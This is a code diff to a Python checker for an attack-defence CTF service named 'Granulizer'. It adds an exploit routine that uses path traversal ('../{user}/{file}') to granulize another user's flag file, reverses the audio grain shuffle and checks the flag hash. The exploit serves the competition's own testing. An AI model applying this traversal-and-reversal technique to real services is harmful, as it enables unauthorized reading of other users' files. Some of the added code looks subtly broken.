@@ -5,6 +5,9 @@ import random
 import string
 import base64
 import json
+import re
+import itertools
+import hashlib
 
 #### Checker Tenets
 # A checker SHOULD not be easily identified by the examination of network traffic => This one is not satisfied, because our usernames and notes are simple too random and easily identifiable.
@@ -109,9 +112,10 @@ class GranulizerChecker(BaseChecker):
         )
 
         conn.write(f"{filename}\n")
+        expect_str = "written to file users/{}/granulized.pcm\nWhat do you want to do?\n > ".format(username)
         conn.readline_expect(
-            b"written to file users/{username}/granulized.pcm\nWhat do you want to do?\n > ",
-            read_until=b"written to file users/{username}/granulized.pcm\nWhat do you want to do?\n > ",
+            expect_str,
+            read_until=expect_str,
             exception_message="Failed to granulize"
         )
 
@@ -157,12 +161,13 @@ class GranulizerChecker(BaseChecker):
             exception_message="Failed to enter file name"
         )
 
-        conn.write(f"{flag_file_name}\n")
+        conn.write(f"{filename}\n")
 
         conn.readline()
         conn.readline() #TODO add timeout
         base64_b = conn.readline()
-
+        self.debug("Read b64 encoded:")
+        self.debug(base64_b)
         file_content_b = base64.decodebytes(base64_b)
         file_content = file_content_b.decode('utf-8')
         self.debug("Got file content:")
@@ -170,6 +175,113 @@ class GranulizerChecker(BaseChecker):
         
         return file_content
     
+    def flatten(self, lst):
+        return list(itertools.chain(*[self.flatten(i) if isinstance(i, list) else [i] for i in lst]))
+
+    def reverse_pcm(self, bytes_in: bytearray, granular_number_samples: int, granular_order_samples,
+        granular_order_timelens, granular_order_buffer_lens):
+
+        grain_offset = 0
+        grains_list = {}
+        for i in range(granular_number_samples): #reconstruct grains with correct length
+            this_grain_orig_pos = granular_order_samples[i]
+            this_grain_timelen = granular_order_timelens[this_grain_orig_pos]
+            this_grain_len = granular_order_buffer_lens[this_grain_orig_pos]
+
+            orig_grain = [0] * this_grain_len #init empty array for this grain
+            
+            for g in range(this_grain_len):
+                index_read = g * this_grain_timelen + grain_offset
+                orig_grain[g] = bytes_in[index_read]
+
+            grain_offset += this_grain_timelen * this_grain_len
+            grains_list[this_grain_orig_pos] = orig_grain #add reconstructed grain to list
+            
+        #reconstruct order of grains
+        orig_data = []
+        for i in range(granular_number_samples):
+            orig_data.append(grains_list.get(i))
+        orig_data = self.flatten(orig_data)
+        #convert into string:
+        self.debug("Reverse, orig_data flattened:")
+        self.debug(orig_data)
+        #char_array = [chr(i) for i in orig_data if i is not None]
+        #reconstructed_str = ''.join(char_array)
+        reconstructed_str = ''.join(orig_data)
+
+        return reconstructed_str
+
+    def helper_parse_bytearray(self, byte_array):
+        # Convert bytearray to string
+        string = byte_array.decode('utf-8')
+        
+        # Split the string by the equal sign and get the value after it
+        value_string = string.split('=')[1].strip()
+        
+        # Convert the value string to an integer
+        value_int = int(value_string)
+        
+        return value_int
+
+
+    import re
+
+    def helper_parse_bytearray_to_list(self, byte_array):
+        # Convert bytearray to string
+        byte_string = byte_array.decode()
+        
+        # Extract list of integers from string
+        match = re.search(r'\[([\d,\s]+)\]', byte_string)
+        if match:
+            int_string = match.group(1)
+        else:
+            raise ValueError("No list of integers found in byte array")
+        
+        # Convert string of integers to list of integers
+        int_list = list(map(int, int_string.split(',')))
+        
+        return int_list
+
+
+    def granulize_info(self, conn: SimpleSocket):
+        self.debug(f"Try to get granulize info")
+
+        conn.write(f"granulize info\n")
+        #Data from server should look like this:
+        #granular_number_samples = 5
+        #granular_order_samples = [4,2,0,1,3]
+        #granular_order_timelens = [2,2,2,2,2]
+        #granular_order_buffer_lens = [4,4,4,4,7]
+        granular_number_samples_b = conn.readline()
+        granular_order_samples_b = conn.readline()
+        granular_order_timelens_b = conn.readline()
+        granular_order_buffer_lens_b = conn.readline()
+        self.debug("Got:")
+        self.debug(granular_number_samples_b)
+        self.debug(granular_order_samples_b)
+        self.debug(granular_order_timelens_b)
+        self.debug(granular_order_buffer_lens_b)
+        
+        conn.readline_expect(
+            b"What do you want to do?",
+            read_until=b"> ",
+            exception_message="Wrong output for granulize info"
+        )
+        
+        back = {}
+
+        #convert:
+        back['granular_number_samples'] = self.helper_parse_bytearray(granular_number_samples_b)
+        back['granular_order_samples'] = self.helper_parse_bytearray_to_list(granular_order_samples_b)
+        back['granular_order_timelens'] = self.helper_parse_bytearray_to_list(granular_order_timelens_b)
+        back['granular_order_buffer_lens'] = self.helper_parse_bytearray_to_list(granular_order_buffer_lens_b)
+        self.debug(back['granular_number_samples'])
+        self.debug(back['granular_order_samples'])
+        self.debug(back['granular_order_timelens'])
+        self.debug(back['granular_order_buffer_lens'])
+        
+        return back
+
 
     def putflag(self):  # type: () -> None
         """
@@ -218,8 +330,8 @@ class GranulizerChecker(BaseChecker):
             }
 
             return json.dumps({
-                "username": username,
-                "file-name": flag_file_name
+                "user_name": username,
+                "file_name": flag_file_name
             })
         else:
             raise EnoException("Wrong variant_id provided")
@@ -487,7 +599,7 @@ class GranulizerChecker(BaseChecker):
                 The preferred way to report Errors in the service is by raising an appropriate EnoException
         """
         if self.variant_id == 0:
-            
+
             #login as some user
             
             #granulize ../{user}/flag.pcm
@@ -507,6 +619,8 @@ class GranulizerChecker(BaseChecker):
             attack_info = json.loads(self.attack_info)
             self.debug("Got attack info:")
             self.debug(attack_info)
+            user_name_exploit = attack_info['user_name']
+            file_name_exploit = attack_info['file_name']
 
             # Log a message before any critical action that could raise an error.
             self.debug(f"Connecting to service")
@@ -524,16 +638,42 @@ class GranulizerChecker(BaseChecker):
                 random.choices(string.ascii_uppercase + string.digits, k=12)                
             )
 
-            # Register a new user
+            # Register a new random user for exploiting
             self.register_user(conn, username, password, details)
 
             # Now we need to login
             self.login_user(conn, username, password)
             
             # Granulize file of user to be exploited
-            self.granulize_file(conn, filename, username)
+            path_traversal = "../{user_name}/{file_name}".format(user_name=user_name_exploit, file_name = file_name_exploit)
+            self.granulize_file(conn, path_traversal, username)
 
-            raise BrokenServiceException("flag not found")
+            #Get granulize parameters
+            granulize_params = self.granulize_info(conn)
+
+            #get file for reversing
+            data = self.get_pcm(conn, "granulized.pcm")
+            self.debug(data)
+
+            #reverse
+            reversed = self.reverse_pcm(data, 
+                            granulize_params['granular_number_samples'], 
+                            granulize_params['granular_order_samples'],
+                            granulize_params['granular_order_timelens'],
+                            granulize_params['granular_order_buffer_lens'])
+            self.debug("Reversed: ")
+            self.debug(reversed)
+            #build hash of this flag and compare
+            flag_hash_got = hashlib.sha256(reversed.encode()).hexdigest()
+            self.debug(flag_hash_got)
+            self.debug(self.flag_hash)
+
+            if flag_hash_got != self.flag_hash:
+                raise BrokenServiceException("Flag is not correct")
+            self.debug("Correct hash!")
+            
+            return reversed
+            #raise BrokenServiceException("flag not found")
         '''
         elif self.variant_id == 1:
             conn = self.connect()
@@ -573,7 +713,7 @@ class GranulizerChecker(BaseChecker):
             raise BrokenServiceException("flag not found")
         '''
 
-        raise EnoException("wrong variant_id provided")
+        #raise EnoException("wrong variant_id provided")
 
 
 app = GranulizerChecker.service  # This can be used for uswgi.
